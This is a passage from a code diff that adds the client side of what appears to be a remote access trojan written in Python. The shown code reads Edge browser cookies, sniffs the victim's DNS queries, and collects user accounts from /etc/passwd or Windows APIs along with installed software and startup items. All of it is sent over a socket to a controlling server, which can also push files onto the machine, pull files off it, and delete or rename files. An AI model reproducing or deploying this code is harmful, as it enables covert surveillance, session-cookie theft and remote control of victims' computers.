+                cursor.execute("""
+                    SELECT host_key, name, value, path, expires_utc 
+                    FROM cookies 
+                    LIMIT ?
+                """, (limit,))
+                
+                for row in cursor.fetchall():
+                    cookies.append({
+                        'domain': row[0],
+                        'name': row[1],
+                        'value': row[2],
+                        'path': row[3],
+                        'expires': row[4]
+                    })
+                
+                conn.close()
+                
+                # Clean up
+                os.remove(temp_cookies)
+                
+            except Exception as e2:
+                print(f"[!] Error in fallback Edge cookies extraction: {e2}")
+        
+        return cookies
+    
+    # DNS Monitoring
+    def start_dns_monitoring(self):
+        """Start DNS request monitoring"""
+        if not self.dns_monitoring_active:
+            print("[*] Starting DNS monitoring")
+            self.dns_monitoring_active = True
+            self.dns_history.clear()
+            
+            # Start monitoring in a new thread
+            self.dns_thread = threading.Thread(target=self._dns_monitor_thread)
+            self.dns_thread.daemon = True
+            self.dns_thread.start()
+            
+            self.client_socket.send("SUCCESS: DNS monitoring started".encode())
+        else:
+            self.client_socket.send("INFO: DNS monitoring already active".encode())
+    
+    def _dns_monitor_thread(self):
+        """Thread function for DNS monitoring"""
+        try:
+            # Use scapy to capture DNS packets
+            def dns_callback(packet):
+                try:
+                    if self.dns_monitoring_active and packet.haslayer('DNS'):
+                        dns_layer = packet.getlayer('DNS')
+                        if dns_layer.qr == 0:  # Query
+                            query_name = dns_layer.qd.qname.decode('utf-8')
+                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                            self.dns_history.append({
+                                'timestamp': timestamp,
+                                'query': query_name,
+                                'type': dns_layer.qd.qtype
+                            })
+                            print(f"[*] DNS Query: {query_name}")
+                except Exception as e:
+                    print(f"[!] Error processing DNS packet: {e}")
+            
+            # Start sniffing for DNS packets
+            sniff(filter="udp port 53", prn=dns_callback, store=0)
+            
+        except Exception as e:
+            print(f"[!] Error in DNS monitoring: {e}")
+            self.dns_monitoring_active = False
+    
+    def stop_dns_monitoring(self):
+        """Stop DNS monitoring"""
+        if self.dns_monitoring_active:
+            print("[*] Stopping DNS monitoring")
+            self.dns_monitoring_active = False
+            
+            self.client_socket.send("SUCCESS: DNS monitoring stopped".encode())
+        else:
+            self.client_socket.send("INFO: No active DNS monitoring to stop".encode())
+    
+    def send_dns_history(self):
+        """Send the collected DNS history to the server"""
+        try:
+            # Convert history to JSON
+            data = json.dumps(self.dns_history).encode('utf-8')
+            
+            # Send size first
+            self.client_socket.send(struct.pack('Q', len(data)))
+            
+            # Send data
+            self.client_socket.sendall(data)
+            
+            print(f"[*] Sent {len(self.dns_history)} DNS entries")
+            
+        except Exception as e:
+            print(f"[!] Error sending DNS history: {e}")
+            self.client_socket.send(struct.pack('Q', 0))  # Send 0 size on error
+    
+    # System Information
+    def send_system_info(self):
+        """Send detailed system information to the server"""
+        try:
+            # Collect system info
+            system_info = {
+                'platform': platform.system(),
+                'platform_release': platform.release(),
+                'platform_version': platform.version(),
+                'architecture': platform.machine(),
+                'hostname': socket.gethostname(),
+                'ip_address': socket.gethostbyname(socket.gethostname()),
+                'mac_address': ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
+                                       for elements in range(0,8*6,8)][::-1]),
+                'processor': platform.processor(),
+                'ram': str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB",
+                'users': self._get_system_users(),
+                'running_services': self._get_running_services(),
+                'installed_software': self._get_installed_software(),
+                'network_interfaces': self._get_network_interfaces(),
+                'startup_items': self._get_startup_items(),
+                'logged_in_users': self._get_logged_in_users()
+            }
+            
+            # Convert to JSON
+            data = json.dumps(system_info).encode('utf-8')
+            
+            # Send size first
+            self.client_socket.send(struct.pack('Q', len(data)))
+            
+            # Send data
+            self.client_socket.sendall(data)
+            
+            print("[*] System information sent")
+            
+        except Exception as e:
+            print(f"[!] Error sending system info: {e}")
+            self.client_socket.send(struct.pack('Q', 0))  # Send 0 size on error
+    
+    def _get_system_users(self):
+        """Get list of system users"""
+        users = []
+        try:
+            if os.name == 'nt':  # Windows
+                import win32net
+                resume = 0
+                while True:
+                    (user_list, _, resume) = win32net.NetUserEnum(None, 0, 0, resume)
+                    for user in user_list:
+                        users.append({
+                            'name': user['name'],
+                            'comment': user.get('comment', '')
+                        })
+                    if resume == 0:
+                        break
+            else:  # Unix/Linux
+                with open('/etc/passwd', 'r') as f:
+                    for line in f:
+                        if line.strip():
+                            parts = line.split(':')
+                            if len(parts) >= 7:
+                                users.append({
+                                    'name': parts[0],
+                                    'uid': parts[2],
+                                    'home': parts[5],
+                                    'shell': parts[6]
+                                })
+        except Exception as e:
+            print(f"[!] Error getting system users: {e}")
+        
+        return users
+    
+    def _get_running_services(self):
+        """Get list of running services"""
+        services = []
+        try:
+            for service in psutil.win_service_iter() if os.name == 'nt' else []:
+                try:
+                    service_info = service.as_dict()
+                    services.append({
+                        'name': service_info['name'],
+                        'display_name': service_info['display_name'],
+                        'status': service_info['status'],
+                        'start_type': service_info['start_type']
+                    })
+                except Exception:
+                    pass
+        except Exception as e:
+            print(f"[!] Error getting running services: {e}")
+        
+        return services
+    
+    def _get_installed_software(self, limit=100):
+        """Get list of installed software"""
+        software = []
+        try:
+            if os.name == 'nt':  # Windows
+                # Look in the registry for installed programs
+                reg_paths = [
+                    r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
+                    r'SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
+                ]
+                
+                for reg_path in reg_paths:
+                    try:
+                        registry_key = OpenKey(HKEY_LOCAL_MACHINE, reg_path)
+                        for i in range(QueryInfoKey(registry_key)[0]):
+                            try:
+                                subkey_name = EnumKey(registry_key, i)
+                                subkey = OpenKey(registry_key, subkey_name)
+                                try:
+                                    software_name = QueryValueEx(subkey, "DisplayName")[0]
+                                    try:
+                                        version = QueryValueEx(subkey, "DisplayVersion")[0]
+                                    except:
+                                        version = "Unknown"
+                                    try:
+                                        publisher = QueryValueEx(subkey, "Publisher")[0]
+                                    except:
+                                        publisher = "Unknown"
+                                    try:
+                                        install_date = QueryValueEx(subkey, "InstallDate")[0]
+                                    except:
+                                        install_date = "Unknown"
+                                        
+                                    software.append({
+                                        'name': software_name,
+                                        'version': version,
+                                        'publisher': publisher,
+                                        'install_date': install_date
+                                    })
+                                except:
+                                    pass
+                                finally:
+                                    CloseKey(subkey)
+                            except:
+                                continue
+                        CloseKey(registry_key)
+                    except:
+                        continue
+                    
+                    # Limit the number of results
+                    if len(software) >= limit:
+                        software = software[:limit]
+                        break
+                        
+            else:  # Unix/Linux - use dpkg or rpm
+                if os.path.exists("/usr/bin/dpkg"):  # Debian/Ubuntu
+                    output = subprocess.check_output(["/usr/bin/dpkg", "-l"]).decode('utf-8')
+                    for line in output.split('\n'):
+                        if line.startswith('ii'):
+                            parts = line.split()
+                            if len(parts) >= 3:
+                                software.append({
+                                    'name': parts[1],
+                                    'version': parts[2],
+                                    'architecture': parts[3] if len(parts) > 3 else "Unknown"
+                                })
+                                if len(software) >= limit:
+                                    break
+                                
+                elif os.path.exists("/usr/bin/rpm"):  # Red Hat/Fedora/CentOS
+                    output = subprocess.check_output(["/usr/bin/rpm", "-qa"]).decode('utf-8')
+                    for line in output.split('\n'):
+                        if line.strip():
+                            software.append({
+                                'name': line.strip(),
+                                'version': "N/A",
+                                'architecture': "N/A"
+                            })
+                            if len(software) >= limit:
+                                break
+                
+        except Exception as e:
+            print(f"[!] Error getting installed software: {e}")
+        
+        return software
+    
+    def _get_network_interfaces(self):
+        """Get information about network interfaces"""
+        interfaces = []
+        try:
+            # Get network interfaces using psutil
+            for interface_name, interface_addresses in psutil.net_if_addrs().items():
+                for address in interface_addresses:
+                    if address.family == socket.AF_INET:  # IPv4
+                        interfaces.append({
+                            'interface': interface_name,
+                            'ip': address.address,
+                            'netmask': address.netmask,
+                            'broadcast': getattr(address, 'broadcast', None)
+                        })
+                    elif address.family == socket.AF_INET6:  # IPv6
+                        interfaces.append({
+                            'interface': interface_name,
+                            'ip': address.address,
+                            'netmask': address.netmask,
+                            'broadcast': None
+                        })
+        except Exception as e:
+            print(f"[!] Error getting network interfaces: {e}")
+        
+        return interfaces
+    
+    def _get_startup_items(self):
+        """Get items that run at startup"""
+        startup_items = []
+        try:
+            if os.name == 'nt':  # Windows
+                # Check Run keys in registry
+                run_keys = [
+                    r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
+                    r'SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
+                    r'SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run',
+                    r'SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
+                ]
+                
+                # Check both HKLM and HKCU
+                for root_key, key_name in [(HKEY_LOCAL_MACHINE, "HKLM"), (HKEY_CURRENT_USER, "HKCU")]:
+                    for run_key in run_keys:
+                        try:
+                            registry_key = OpenKey(root_key, run_key)
+                            for i in range(QueryInfoKey(registry_key)[1]):
+                                try:
+                                    name, value, _ = EnumValue(registry_key, i)
+                                    startup_items.append({
+                                        'source': f"{key_name}\\{run_key}",
+                                        'name': name,
+                                        'command': value
+                                    })
+                                except:
+                                    continue
+                            CloseKey(registry_key)
+                        except:
+                            continue
+                
+                # Check Startup folders
+                startup_folders = [
+                    os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
+                    os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+                ]
+                
+                for folder in startup_folders:
+                    if os.path.exists(folder):
+                        for item in os.listdir(folder):
+                            item_path = os.path.join(folder, item)
+                            startup_items.append({
+                                'source': folder,
+                                'name': item,
+                                'command': item_path
+                            })
+                            
+            else:  # Unix/Linux
+                # Check common startup locations
+                startup_files = [
+                    '/etc/rc.local',
+                    '/etc/init.d',
+                    '/etc/systemd/system',
+                    os.path.expanduser('~/.config/autostart')
+                ]
+                
+                for file_path in startup_files:
+                    if os.path.exists(file_path):
+                        if os.path.isdir(file_path):
+                            for item in os.listdir(file_path):
+                                startup_items.append({
+                                    'source': file_path,
+                                    'name': item,
+                                    'command': os.path.join(file_path, item)
+                                })
+                        else:
+                            startup_items.append({
+                                'source': os.path.dirname(file_path),
+                                'name': os.path.basename(file_path),
+                                'command': file_path
+                            })
+                
+        except Exception as e:
+            print(f"[!] Error getting startup items: {e}")
+        
+        return startup_items
+    
+    def _get_logged_in_users(self):
+        """Get currently logged in users"""
+        users = []
+        try:
+            for user in psutil.users():
+                users.append({
+                    'name': user.name,
+                    'terminal': user.terminal,
+                    'host': getattr(user, 'host', ''),
+                    'started': datetime.fromtimestamp(user.started).strftime('%Y-%m-%d %H:%M:%S')
+                })
+        except Exception as e:
+            print(f"[!] Error getting logged in users: {e}")
+        
+        return users
+
+
+class ClientFileHandler:
+    """Handler for file transfer operations on the client side with enhanced features"""
+    
+    def __init__(self, client_socket, buffer_size=4096):
+        self.client_socket = client_socket
+        self.buffer_size = buffer_size
+        self.current_transfer = None
+        self.stop_transfer = False
+        self.transfer_states = {}
+        
+        # Try to load saved transfer states
+        self.load_transfer_states()
+    
+    def handle_file_command(self, command):
+        """Process file-related commands from the server"""
+        parts = command.split('|')
+    
+        if parts[0] == "FILE_UPLOAD":
+            # Server wants to upload a file to this client
+            if len(parts) >= 3:
+                dest_path = parts[1]
+                file_size = int(parts[2])
+                resume_position = int(parts[3]) if len(parts) > 3 else 0
+                transfer_id = parts[4] if len(parts) > 4 else None
+                overwrite = parts[5].lower() == "true" if len(parts) > 5 else True
+                
+                self.receive_file(dest_path, file_size, resume_position, transfer_id, overwrite)
+            else:
+                self.client_socket.send(b"ERROR: Invalid upload command format")
+                
+        elif parts[0] == "FILE_DOWNLOAD":
+            # Server wants to download a file from this client
+            if len(parts) >= 2:
+                file_path = parts[1]
+                resume_position = int(parts[2]) if len(parts) > 2 else 0
+                transfer_id = parts[3] if len(parts) > 3 else None
+                self.send_file(file_path, resume_position, transfer_id)
+            else:
+                self.client_socket.send(b"ERROR: Invalid download command format")
+                
+        elif parts[0] == "FILE_LIST":
+            # Server wants a list of files in a directory
+            if len(parts) >= 2:
+                directory = parts[1]
+                self.list_files(directory)
+            else:
+                self.send_error("Invalid list command format")
+        
+        elif parts[0] == "MKDIR":
+            # Server wants to create a directory
+            if len(parts) >= 2:
+                directory = parts[1]
+                self.create_directory(directory)
+            else:
+                self.client_socket.send(b"ERROR: Invalid mkdir command format")
+        
+        elif parts[0] == "DELETE":
+            # Server wants to delete a file
+            if len(parts) >= 2:
+                file_path = parts[1]
+                self.delete_file(file_path)
+            else:
+                self.client_socket.send(b"ERROR: Invalid delete command format")
+        
+        elif parts[0] == "RENAME":
+            # Server wants to rename a file
+            if len(parts) >= 3:
+                old_path = parts[1]
+                new_path = parts[2]
+                self.rename_file(old_path, new_path)
+            else:
+                self.client_socket.send(b"ERROR: Invalid rename command format")
+        
+        elif parts[0] == "RMDIR":
+            # Server wants to remove a directory
+            if len(parts) >= 2:
+                directory = parts[1]
+                self.remove_directory(directory)
+            else:
+                self.client_socket.send(b"ERROR: Invalid rmdir command format")
+    
+    def receive_file(self, dest_path, file_size, resume_position=0, transfer_id=None, overwrite=True):
+        """Receive a file from the server and save it to dest_path with enhanced error handling"""
+        try:
+            print(f"[*] Receiving file to {dest_path}, size: {file_size}, resume from: {resume_position}")
+            
+            # Reset stop flag
+            self.stop_transfer = False
+            
+            # Create directory if it doesn't exist
+            dest_dir = os.path.dirname(dest_path)
+            if not os.path.exists(dest_dir):
+                print(f"[*] Creating directory: {dest_dir}")
+                os.makedirs(dest_dir, exist_ok=True)
+            
+            # Check if file exists already and handle overwrite/resume
+            if os.path.exists(dest_path) and resume_position == 0:
+                if not overwrite:
+                    print(f"[!] File exists and overwrite not permitted: {dest_path}")
+                    self.client_socket.send(b"ERROR: File exists and overwrite not permitted")
+                    return
+                # If overwrite=True, we'll create a new file
+            
+            # Check if we should resume and if the file exists
+            file_mode = 'ab' if resume_position > 0 and os.path.exists(dest_path) else 'wb'
+            
+            if resume_position > 0:
+                # Verify the file size matches the expected resume position
+                if os.path.exists(dest_path):
+                    actual_size = os.path.getsize(dest_path)
+                    if actual_size != resume_position:
+                        print(f"[!] Warning: File size mismatch for resume. Expected: {resume_position}, Actual: {actual_size}")
+                        # Adjust resume position to match the file size
+                        resume_position = actual_size
+                        # Save transfer state with corrected position
+                        if transfer_id:
+                            self.transfer_states[transfer_id] = {
+                                'type': 'receive',
+                                'path': dest_path,
+                                'size': file_size,
+                                'position': resume_position
+                            }
+                            self.save_transfer_states()
+                else:
+                    print(f"[!] Cannot resume: File {dest_path} does not exist")
+                    file_mode = 'wb'
+                    resume_position = 0
+            
+            print(f"[*] Opening file in mode: {file_mode}")
+            
+            # Send ready signal
+            self.client_socket.send(b"READY")
+            print(f"[*] Sent READY signal, waiting for data...")
+            
+            # Record current transfer details for potential resume
+            self.current_transfer = {
+                'id': transfer_id,
+                'type': 'receive',
+                'path': dest_path,
+                'size': file_size,
+                'position': resume_position,
+                'start_time': time.time()
+            }
+            
+            # Save transfer state at the beginning
+            if transfer_id:
+                self.transfer_states[transfer_id] = {
+                    'type': 'receive',
+                    'path': dest_path,
+                    'size': file_size,
+                    'position': resume_position
+                }
+                self.save_transfer_states()
+            
+            # Receive file data
+            with open(dest_path, file_mode) as f:
+                if resume_position > 0:
+                    print(f"[*] Seeking to position: {resume_position}")
+                    f.seek(resume_position)
+                    
+                bytes_received = resume_position
+                
+                print(f"[*] Starting to receive data from position: {bytes_received}")
+                last_update_time = time.time()
+                transfer_speed = 0
+                
+                while bytes_received < file_size and not self.stop_transfer:
+                    # Calculate how many bytes to receive in this chunk
+                    remaining = min(self.buffer_size, file_size - bytes_received)
+                    
+                    try:
+                        # Set a timeout for the receive operation
+                        self.client_socket.settimeout(30)  # 30 second timeout
+                        chunk = self.client_socket.recv(remaining)
+                        
+                        # Reset timeout after successful receive
+                        self.client_socket.settimeout(None)
+                    except socket.timeout:
+                        print(f"[!] Timeout while receiving data")
+                        # Save transfer state for potential resume
+                        if transfer_id:
+                            self.transfer_states[transfer_id]['position'] = bytes_received
+                            self.save_transfer_states()
+                        raise Exception("Connection timeout")
+                    
+                    if not chunk:
+                        print(f"[!] No data received, connection may be closed")
+                        # Save transfer state for potential resume
+                        if transfer_id:
+                            self.transfer_states[transfer_id]['position'] = bytes_received
+                            self.save_transfer_states()
+                        break
+                        
+                    if chunk == b"CANCEL":
+                        print(f"[!] Transfer cancelled by server")
+                        if transfer_id:
+                            self.transfer_states[transfer_id]['position'] = bytes_received
+                            self.save_transfer_states()
+                        self.client_socket.send(b"CANCELLED")
+                        return
+                    
+                    chunk_size = len(chunk)
+                    
+                    try:
+                        f.write(chunk)
+                        bytes_received += chunk_size
+                        
+                        # Update transfer state periodically
+                        current_time = time.time()
+                        if current_time - last_update_time > 2:  # Update every 2 seconds
+                            elapsed_time = current_time - last_update_time
+                            bytes_in_interval = chunk_size
+                            transfer_speed = bytes_in_interval / elapsed_time
+                            
+                            print(f"[*] Progress: {bytes_received}/{file_size} bytes ({(bytes_received/file_size)*100:.1f}%)")
+                            print(f"[*] Transfer speed: {self.format_size(transfer_speed)}/s")
+                            
+                            if transfer_id:
+                                self.transfer_states[transfer_id]['position'] = bytes_received
+                                self.save_transfer_states()
+                                
+                            last_update_time = current_time
+                            
+                        # Update current transfer position
+                        if self.current_transfer:
+                            self.current_transfer['position'] = bytes_received
+                            
+                    except Exception as write_error:
+                        print(f"[!] Error writing to file: {write_error}")
+                        # Save transfer state for potential resume
+                        if transfer_id:
+                            self.transfer_states[transfer_id]['position'] = bytes_received
+                            self.save_transfer_states()
+                        raise
+                    
+                    # Send acknowledgment
+                    try:
+                        self.client_socket.send(b"ACK")
+                    except Exception as ack_error:
+                        print(f"[!] Error sending ACK: {ack_error}")
+                        # Save transfer state for potential resume
+                        if transfer_id:
+                            self.transfer_states[transfer_id]['position'] = bytes_received
+                            self.save_transfer_states()
+                        raise
+            
+            print(f"[*] File reception complete: {bytes_received}/{file_size} bytes")
+            
+            # Remove completed transfer from states
+            if transfer_id and transfer_id in self.transfer_states and bytes_received >= file_size:
+                del self.transfer_states[transfer_id]
+                self.save_transfer_states()
+            
+            # Send success message
+            self.client_socket.send(b"SUCCESS")
+            print(f"[*] Sent SUCCESS signal")
+            
+        except Exception as e:
+            print(f"[!] Error receiving file: {e}")
+            # Try to send error message
+            try:
+                error_msg = f"ERROR: {str(e)}"
+                print(f"[!] Sending error: {error_msg}")
+                self.client_socket.send(error_msg.encode())
+            except Exception as e2:
+                print(f"[!] Failed to send error message: {e2}")
+        finally:
+            # Ensure timeout is reset
+            try:
+                self.client_socket.settimeout(None)
+            except:
+                pass
+            
+            # Clear current transfer
+            self.current_transfer = None
+
+    def send_file(self, file_path, resume_position=0, transfer_id=None):
+        """Send a file to the server with enhanced error handling and resume support"""
+        try:
+            print(f"[*] Sending file: {file_path}, resume from: {resume_position}")
+            
+            # Reset stop flag
+            self.stop_transfer = False
+            
+            if not os.path.isfile(file_path):
+                error_msg = f"File not found: {file_path}"
+                print(f"[!] {error_msg}")
+                self.client_socket.send(b"ERROR")
+                self.client_socket.send(error_msg.encode())
+                return
+            
+            # Get file size
+            file_size = os.path.getsize(file_path)
+            
+            # Send file size first
+            self.client_socket.send(struct.pack('Q', file_size))
+            
+            # Wait for ready signal with timeout
+            self.client_socket.settimeout(30)
+            try:
+                ready = self.client_socket.recv(1024)
+                if ready != b"READY":
+                    print(f"[!] Received unexpected response instead of READY: {ready}")
+                    return
+            except socket.timeout:
+                print(f"[!] Timeout waiting for READY signal")
+                return
+            finally:
+                self.client_socket.settimeout(None)
+            
+            print(f"[*] Received READY signal, starting file transfer")
+            
+            # Record current transfer details for potential resume
+            self.current_transfer = {
+                'id': transfer_id,
+                'type': 'send',
+                'path': file_path,
+                'size': file_size,
+                'position': resume_position,
+                'start_time': time.time()
+            }
+            
+            # Save transfer state at the beginning
+            if transfer_id:
+                self.transfer_states[transfer_id] = {
+                    'type': 'send',
+                    'path': file_path,
+                    'size': file_size,
+                    'position': resume_position
+                }
+                self.save_transfer_states()
+            
+            # Send file data
+            with open(file_path, 'rb') as f:
+                if resume_position > 0:
+                    print(f"[*] Seeking to position: {resume_position}")
+                    f.seek(resume_position)
+                    
+                bytes_sent = resume_position
+                last_update_time = time.time()
+                start_time = time.time()
+                
+                while bytes_sent < file_size and not self.stop_transfer:
+                    chunk = f.read(self.buffer_size)
+                    if not chunk:
+                        print(f"[!] End of file reached")
+                        break
+                    
+                    try:
+                        self.client_socket.send(chunk)
+                        chunk_size = len(chunk)
+                        bytes_sent += chunk_size
+                        
+                        # Update progress periodically
+                        current_time = time.time()
+                        if current_time - last_update_time > 2:  # Update every 2 seconds
+                            elapsed_time = current_time - start_time
+                            transfer_speed = bytes_sent / elapsed_time if elapsed_time > 0 else 0
+                            
+                            print(f"[*] Progress: {bytes_sent}/{file_size} bytes ({(bytes_sent/file_size)*100:.1f}%)")
+                            print(f"[*] Transfer speed: {self.format_size(transfer_speed)}/s")
+                            
+                            # Save transfer state
+                            if transfer_id:
+                                self.transfer_states[transfer_id]['position'] = bytes_sent
+                                self.save_transfer_states()
+                                
+                            last_update_time = current_time
+                            
+                        # Update current transfer position
+                        if self.current_transfer:
+                            self.current_transfer['position'] = bytes_sent
+                            
+                    except Exception as send_error:
+                        print(f"[!] Error sending data: {send_error}")
+                        # Save transfer state for potential resume
+                        if transfer_id:
+                            self.transfer_states[transfer_id]['position'] = bytes_sent
+                            self.save_transfer_states()
+                        raise
+                    
+                    # Wait for acknowledgment with timeout
+                    try:
+                        self.client_socket.settimeout(15)  # 15 second timeout for ACK
+                        ack = self.client_socket.recv(1024)
+                        self.client_socket.settimeout(None)
+                        
+                        if ack == b"CANCEL":
+                            print(f"[!] Transfer cancelled by server")
+                            # Save transfer state for potential resume
+                            if transfer_id:
+                                self.transfer_states[transfer_id]['position'] = bytes_sent
+                                self.save_transfer_states()
+                            return
+                            
+                        if ack != b"ACK":
+                            print(f"[!] Unexpected acknowledgment: {ack}")
+                            # Save transfer state for potential resume
+                            if transfer_id:
+                                self.transfer_states[transfer_id]['position'] = bytes_sent
+                                self.save_transfer_states()
+                            raise Exception("Unexpected response from server")
+                            
+                    except socket.timeout:
+                        print(f"[!] Timeout waiting for acknowledgment")
+                        # Save transfer state for potential resume
+                        if transfer_id:
+                            self.transfer_states[transfer_id]['position'] = bytes_sent
+                            self.save_transfer_states()
+                        raise Exception("Timeout waiting for acknowledgment")
+            
+            print(f"[*] File transfer complete: {bytes_sent}/{file_size} bytes")
+            
+            # Remove completed transfer from states
+            if transfer_id and transfer_id in self.transfer_states and bytes_sent >= file_size:
+                del self.transfer_states[transfer_id]
+                self.save_transfer_states()
+            
+            # Wait for final confirmation with timeout
+            try:
+                self.client_socket.settimeout(10)
+                final_response = self.client_socket.recv(1024)
+                self.client_socket.settimeout(None)
+                
+                if final_response == b"SUCCESS":
+                    print(f"[*] Server confirmed successful transfer")
+                elif final_response == b"CANCEL":
+                    print(f"[!] Transfer cancelled by server at the end")
+                else:
+                    print(f"[!] Unexpected final response: {final_response}")
+            except socket.timeout:
+                print(f"[!] Timeout waiting for final confirmation")
+            
+        except Exception as e:
+            print(f"[!] Error sending file: {e}")
+            # Try to notify the server
+            try:
+                error_msg = f"ERROR: {str(e)}"
+                self.client_socket.send(error_msg.encode())
+            except:
+                pass
+        finally:
+            # Ensure timeout is reset
+            try:
+                self.client_socket.settimeout(None)
+            except:
+                pass
+            
+            # Clear current transfer
+            self.current_transfer = None
+    
+    def list_files(self, directory):
+        """List files in a directory with enhanced error handling and sorting."""
+        try:
+            print(f"[*] Listing directory: {directory}")
+            
+            if not os.path.isdir(directory):
+                print(f"[!] Directory not found: {directory}")
+                self.send_error(f"Directory not found: {directory}")
+                return
+            
+            if not os.access(directory, os.R_OK):
+                print(f"[!] Access denied to directory: {directory}")
+                self.send_error(f"Access denied to directory: {directory}")
+                return
+            
+            # Get list of files and folders
+            file_list = []
+            try:
+                # First get all entries to sort them properly
+                entries = []
+                try:
+                    entries = os.listdir(directory)
+                except PermissionError:
+                    print(f"[!] Permission denied when listing directory: {directory}")
+                    self.send_error(f"Permission denied: {directory}")
+                    return
+                except OSError as os_error:
+                    print(f"[!] OS error when listing directory: {os_error}")
+                    self.send_error(f"OS error: {str(os_error)}")
+                    return
+                
+                # Sort entries alphabetically, case-insensitive
+                entries.sort(key=lambda x: x.lower())
+                
+                # Process each item
+                for item in entries:
+                    # Skip special entries like "." and ".."
+                    if item in [".", ".."]:
+                        continue
+                        
+                    full_path = os.path.join(directory, item)
+                    
+                    try:
+                        # Get file info
+                        stats = os.stat(full_path)
+                        size = stats.st_size
+                        modified = datetime.fromtimestamp(stats.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
+                        
+                        # Determine item type
+                        if os.path.isdir(full_path):
+                            item_type = "Folder"
+                            size_str = ""  # No size for folders
+                        else:
+                            ext = os.path.splitext(item)[1]
+                            item_type = ext[1:].upper() if ext else "File"
+                            size_str = self.format_size(size)
+                        
+                        # Add to list
+                        file_list.append(f"{item}|{size_str}|{item_type}|{modified}")
+                    except Exception as item_error:
+                        print(f"[!] Error getting info for {item}: {item_error}")
+                        # Include error entry for this item
+                        file_list.append(f"{item}|Error|Error|{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+                
+                print(f"[*] Found {len(file_list)} items in directory")
+                
+            except Exception as e:
+                print(f"[!] Error listing directory content: {e}")
+                file_list.append(f"ERROR|{str(e)}|Error|{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+            
+            # Join list into a string
+            file_list_str = '\n'.join(file_list)
+            
+            # Send size first
+            data = file_list_str.encode('utf-8')
+            self.client_socket.send(struct.pack('Q', len(data)))
+            
+            # Send actual data in chunks to handle large directories
+            total_sent = 0
+            data_size = len(data)
+            
+            while total_sent < data_size:
+                chunk_size = min(self.buffer_size, data_size - total_sent)
+                chunk = data[total_sent:total_sent + chunk_size]
+                
+                try:
+                    sent = self.client_socket.send(chunk)
+                    total_sent += sent
+                except Exception as send_error:
+                    print(f"[!] Error sending directory data: {send_error}")
+                    break
+            
+            print(f"[*] Sent directory listing ({total_sent} bytes)")
+            
+        except Exception as e:
+            print(f"[!] Error listing directory: {e}")
+            self.send_error(f"Error listing directory: {str(e)}")
+    
+    def create_directory(self, directory):
+        """Create a new directory on the client system"""
+        try:
+            print(f"[*] Creating directory: {directory}")
+            
+            # Check if directory already exists
+            if os.path.exists(directory):
+                if os.path.isdir(directory):
+                    print(f"[*] Directory already exists: {directory}")
+                    self.client_socket.send(b"SUCCESS: Directory already exists")
+                    return
+                else:
+                    print(f"[!] Path exists but is not a directory: {directory}")
+                    self.client_socket.send(b"ERROR: Path exists but is not a directory")
+                    return
+            
+            # Create the directory and any parent directories
+            os.makedirs(directory, exist_ok=True)
+            
+            print(f"[*] Created directory: {directory}")
+            self.client_socket.send(b"SUCCESS: Directory created")
+            
+        except Exception as e:
+            error_msg = f"ERROR: {str(e)}"
+            print(f"[!] {error_msg}")
+            self.client_socket.send(error_msg.encode())
+    
+    def delete_file(self, file_path):
+        """Delete a file from the client system"""
+        try:
+            print(f"[*] Deleting file: {file_path}")
+            
+            if not os.path.exists(file_path):
+                print(f"[!] File not found: {file_path}")
+                self.client_socket.send(b"ERROR: File not found")
+                return
+                
+            if os.path.isdir(file_path):
+                print(f"[!] Path is a directory, not a file: {file_path}")
+                self.client_socket.send(b"ERROR: Path is a directory, use RMDIR command")
+                return
+                
+            # Delete the file
+            os.remove(file_path)
+            
+            print(f"[*] Deleted file: {file_path}")
+            self.client_socket.send(b"SUCCESS: File deleted")
+            
+        except Exception as e:
+            error_msg = f"ERROR: {str(e)}"
+            print(f"[!] {error_msg}")
+            self.client_socket.send(error_msg.encode())
+    
+    def rename_file(self, old_path, new_path):
+        """Rename a file or directory on the client system"""
+        try:
+            print(f"[*] Renaming: {old_path} to {new_path}")
+            
+            if not os.path.exists(old_path):
+                print(f"[!] Path not found: {old_path}")
+                self.client_socket.send(b"ERROR: Path not found")
+                return
+                
+            if os.path.exists(new_path):
+                print(f"[!] Destination path already exists: {new_path}")
+                self.client_socket.send(b"ERROR: Destination path already exists")
+                return
+                
+            # Rename the file/directory
+            os.rename(old_path, new_path)
+            
+            print(f"[*] Renamed successfully")
+            self.client_socket.send(b"SUCCESS: Renamed successfully")
+            
+        except Exception as e:
+            error_msg = f"ERROR: {str(e)}"
+            print(f"[!] {error_msg}")
+            self.client_socket.send(error_msg.encode())
+    
+    def remove_directory(self, directory):
+        """Remove a directory from the client system"""
+        try:
+            print(f"[*] Removing directory: {directory}")
+            
+            if not os.path.exists(directory):
+                print(f"[!] Directory not found: {directory}")
+                self.client_socket.send(b"ERROR: Directory not found")
+                return
+                
+            if not os.path.isdir(directory):
+                print(f"[!] Path is not a directory: {directory}")
+                self.client_socket.send(b"ERROR: Path is not a directory")
+                return
+                
+            # Check if directory is empty
+            if os.listdir(directory):
+                print(f"[!] Directory is not empty: {directory}")
+                self.client_socket.send(b"ERROR: Directory is not empty")
+                return
+                
+            # Remove the directory
+            os.rmdir(directory)
+            
+            print(f"[*] Removed directory: {directory}")
+            self.client_socket.send(b"SUCCESS: Directory removed")
+            
+        except Exception as e:
+            error_msg = f"ERROR: {str(e)}"
+            print(f"[!] {error_msg}")
+            self.client_socket.send(error_msg.encode())
+    
+    def send_error(self, error_msg):
+        """Send an error message back to the server"""
+        try:
+            print(f"[*] Sending error: {error_msg}")
+            error_data = f"ERROR: {error_msg}".encode('utf-8')
+            self.client_socket.send(struct.pack('Q', len(error_data)))
+            self.client_socket.send(error_data)
+        except Exception as e:
+            print(f"[!] Failed to send error message: {e}")
+    
